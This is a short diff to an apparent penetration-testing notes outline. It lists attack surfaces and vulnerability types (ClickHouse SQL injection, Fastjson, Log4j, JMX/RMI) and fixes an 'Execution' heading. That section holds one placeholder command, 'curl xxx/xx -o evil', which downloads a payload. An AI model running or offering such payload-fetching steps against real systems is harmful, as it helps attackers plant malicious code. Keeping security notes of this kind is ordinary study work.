@@ -8,7 +8,7 @@
 - Cloud Service
 
 ### 2. Vulnerability
-- SQL Injection : clickhouse
+- SQL Injection : [clickhouse](https://blog.deteact.com/yandex-clickhouse-injection/)
 - Open-source Nday:
   - Fastjson
   - Log4j
@@ -29,7 +29,7 @@
 - JRMP/[JMX](https://www.anquanke.com/post/id/200682)/RMI 
 
 
-## Excetion
+## Execution
 - curl xxx/xx -o evil
 - 
 
